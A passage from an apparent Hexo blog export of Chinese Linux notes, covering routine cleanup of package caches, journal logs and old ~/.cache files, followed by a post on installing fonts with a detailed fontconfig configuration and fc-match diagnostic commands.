<h2 id="redhat系"><a href="#redhat系" class="headerlink" title="redhat系"></a>redhat系</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum clean packages 		<span class="comment"># 清除缓存目录下的软件包</span></span><br><span class="line">yum clean headers 		<span class="comment"># 清除缓存目录下的 headers</span></span><br><span class="line">yum clean oldheaders 	<span class="comment"># 清除缓存目录下旧的 headers</span></span><br><span class="line">yum clean all 			<span class="comment"># 清除缓存目录下的软件包及旧的headers</span></span><br></pre></td></tr></table></figure>
<h1 id="清理日志垃圾"><a href="#清理日志垃圾" class="headerlink" title="清理日志垃圾"></a>清理日志垃圾</h1><h2 id="查看日志文件"><a href="#查看日志文件" class="headerlink" title="查看日志文件"></a>查看日志文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">du -t 100M /var</span><br><span class="line"><span class="comment">#或</span></span><br><span class="line">journalctl --disk-usage</span><br></pre></td></tr></table></figure>
<h2 id="删除日志文件"><a href="#删除日志文件" class="headerlink" title="删除日志文件"></a>删除日志文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo journalctl --vacuum-size=100M  <span class="comment"># 清理日志归档文件(并不清理活动的日志文件)，保留100M</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>--vacuum-size=</code> 可用于限制归档文件的最大磁盘使用量 (可以使用 “K”, “M”, “G”, “T” 后缀)</li>
<li><code>--vacuum-time=</code> 可用于清除指定时间之前的归档 (可以使用 “s”, “m”, “h”, “days”, “weeks”, “months”, “years” 后缀)<br><code>--vacuum-files=</code> 可用于限制日志归档文件的最大数量</li>
</ul>
<h1 id="清理软件数据垃圾"><a href="#清理软件数据垃圾" class="headerlink" title="清理软件数据垃圾"></a>清理软件数据垃圾</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find ~/.cache/ -<span class="built_in">type</span> f -atime +365 -delete 	<span class="comment"># 找到日期大于365天的文件，并直接清理</span></span><br><span class="line">find ~/.cache/ -size +10M 		<span class="comment"># 找到大于10M的文件，酌情清理</span></span><br><span class="line">du -h ~/.cache -t 100M 			<span class="comment"># 列出体积大于100M的目录，酌情清理</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>垃圾清理</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux字体美化</title>
    <url>/posts/711f903b/</url>
    <content><![CDATA[<h1 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h1><h2 id="安装字体"><a href="#安装字体" class="headerlink" title="安装字体"></a>安装字体</h2><p>查看已安装中文字体: <code>fc-list :lang=zh</code></p>
<p>ttf-roboto ttf-hack ttf-dejavu<br>noto-fonts  noto-fonts-cjk  noto-fonts-emoji<br>wqy-microhei wqy-zenhei wqy-bitmapfont ttf-symbola otf-font-awesome pango</p>
<ul>
<li>ttf-roboto : roboto 无衬线字体(英文)</li>
<li>ttf-dejavu : DejaVu 字体(英文)</li>
<li>ttf-hack : hack等宽(英文)</li>
<li>noto-fonts : Noto字体</li>
<li>noto-fonts-cjk : Noto中日韩字体</li>
<li>noto-fonts-emoji : Noto符号字体</li>
<li>wqy-microhei : 文泉驿微米黑，无衬线形式字体(中日韩)</li>
<li>wqy-zenhei : 文泉驿正黑体，黑体 (无衬线) 的中文轮廓字体，附带文泉驿点阵宋体 (也支持部分日韩字符)</li>
<li>wqy-bitmapfont : 文泉驿点阵宋体 (衬线) 中文字体</li>
<li>ttf-symbola : 提供许多 Unicode 符号，包括 Emoji</li>
<li>otf-font-awesome : 字体图标库</li>
<li>pango : 一个开放源的自由文本布局库</li>
</ul>
<a id="more"></a>
<h1 id="我的配置"><a href="#我的配置" class="headerlink" title="我的配置"></a>我的配置</h1><figure class="highlight xml"><figcaption><span>~/.config/fontconfig/fonts.conf</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">fontconfig</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;fonts.dtd&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">fontconfig</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 显示器使用的像素排列方式 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span> <span class="attr">target</span>=<span class="string">&quot;font&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">mode</span>=<span class="string">&quot;assign&quot;</span> <span class="attr">name</span>=<span class="string">&quot;rgba&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">const</span>&gt;</span>rgb<span class="tag">&lt;/<span class="name">const</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 字体微调的程度, 可选 hintnone, hintslight (默认), hintmedium, hintfull. --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 更高的 hinting 等级可使字体更锐利，同时也会损失更多的细节 --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 如果显示器的 DPI 高得不像话 (&gt;=300), 可关闭 hinting, 字体会自然对齐像素 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span> <span class="attr">target</span>=<span class="string">&quot;font&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">mode</span>=<span class="string">&quot;assign&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hintstyle&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">const</span>&gt;</span>hintslight<span class="tag">&lt;/<span class="name">const</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 抗锯齿. 除非屏幕DPI奇高否则建议开启 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span> <span class="attr">target</span>=<span class="string">&quot;font&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">mode</span>=<span class="string">&quot;assign&quot;</span> <span class="attr">name</span>=<span class="string">&quot;antialias&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bool</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 全局默认字体　--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">mode</span>=<span class="string">&quot;prepend&quot;</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Noto Sans<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 全局默认英文字体 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">compare</span>=<span class="string">&quot;contains&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lang&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>en<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">mode</span>=<span class="string">&quot;prepend&quot;</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Bitstream Vera Sans<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 全局默认中文字体 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">compare</span>=<span class="string">&quot;contains&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lang&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>zh<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">mode</span>=<span class="string">&quot;prepend&quot;</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Noto Sans CJK SC<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 默认无衬线字体 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span> <span class="attr">target</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">qual</span>=<span class="string">&quot;any&quot;</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>sans-serif<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;prepend&quot;</span> <span class="attr">binding</span>=<span class="string">&quot;same&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>DeiaVu Sans<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Roboto<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 默认衬线字体 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span> <span class="attr">target</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">qual</span>=<span class="string">&quot;any&quot;</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>serif<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;prepend&quot;</span> <span class="attr">binding</span>=<span class="string">&quot;same&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>DejaVu Serif<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 默认等宽字体 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span> <span class="attr">target</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">qual</span>=<span class="string">&quot;any&quot;</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>monospace<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;prepend&quot;</span> <span class="attr">binding</span>=<span class="string">&quot;same&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Hack<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 字体替换 --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--SimSun, Microsoft YaHei, SimHei -&gt; WenQuanYi Micro Hei --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span> <span class="attr">target</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">test</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>宋体<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;assign&quot;</span> <span class="attr">binding</span>=<span class="string">&quot;strong&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>WenQuanYi Bitmap Song<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>Noto Serif CJK SC<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span> <span class="attr">target</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">test</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>SimSun<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;assign&quot;</span> <span class="attr">binding</span>=<span class="string">&quot;strong&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>WenQuanYi Bitmap Song<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>Noto Serif CJK SC<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span> <span class="attr">target</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">test</span> <span class="attr">qual</span>=<span class="string">&quot;any&quot;</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>SimSun-18030<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;assign&quot;</span> <span class="attr">binding</span>=<span class="string">&quot;same&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>WenQuanYi Bitmap Song<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>Noto Serif CJK SC<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span> <span class="attr">target</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">qual</span>=<span class="string">&quot;any&quot;</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>Microsoft YaHei<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;assign&quot;</span> <span class="attr">binding</span>=<span class="string">&quot;same&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>WenQuanYi Micro Hei<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">match</span> <span class="attr">target</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">qual</span>=<span class="string">&quot;any&quot;</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>SimHei<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;assign&quot;</span> <span class="attr">binding</span>=<span class="string">&quot;same&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>WenQuanYi Micro Hei<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span> <span class="attr">target</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">test</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>Times New Roman<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;append&quot;</span> <span class="attr">binding</span>=<span class="string">&quot;strong&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>Noto Serif CJK SC<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span> <span class="attr">target</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">test</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>Georgia<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">&quot;family&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;append&quot;</span> <span class="attr">binding</span>=<span class="string">&quot;strong&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>Noto Serif CJK SC<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 备用字体优先顺序 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">alias</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">family</span>&gt;</span>sans-serif<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prefer</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>WenQuanYi Micro Hei<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>DejaVu Sans<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Roboto<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Sans<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Sans CJK SC<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Sans CJK TC<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Sans CJK JP<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Sans CJK KR<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Color Emoji<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Emoji<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Font Awesome 5 Free<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">prefer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">alias</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">alias</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">family</span>&gt;</span>serif<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prefer</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>DejaVu Serif<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Serif<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Serif CJK SC<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Serif CJK TC<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Serif CJK JP<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Serif CJK KR<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Color Emoji<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Emoji<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Font Awesome 5 Free<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">prefer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">alias</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">alias</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">family</span>&gt;</span>monospace<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">prefer</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Hack<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>DejaVu Sans Mono<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Sans CJK SC<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Sans CJK TC<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Sans CJK JP<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Sans CJK KR<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Color Emoji<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Noto Emoji<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>Font Awesome 5 Free<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">prefer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">alias</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">fontconfig</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xdpyinfo |grep dimensions  # 分辨率和屏幕大小</span><br><span class="line">xdpyinfo |grep resolution  # dpi</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fc-match serif-12 family autohint hinting hintstyle dpi pixelsize antialias rgba lcdfilter</span><br><span class="line"></span><br><span class="line">fc-match georgia-12 family autohint hinting hintstyle dpi pixelsize antialias rgba lcdfilter</span><br><span class="line"></span><br><span class="line">fc-match sans-serif-12 family autohint hinting hintstyle dpi pixelsize antialias rgba lcdfilter</span><br><span class="line"></span><br><span class="line">fc-match verdana-12 family autohint hinting hintstyle dpi pixelsize antialias rgba lcdfilter</span><br></pre></td></tr></table></figure>
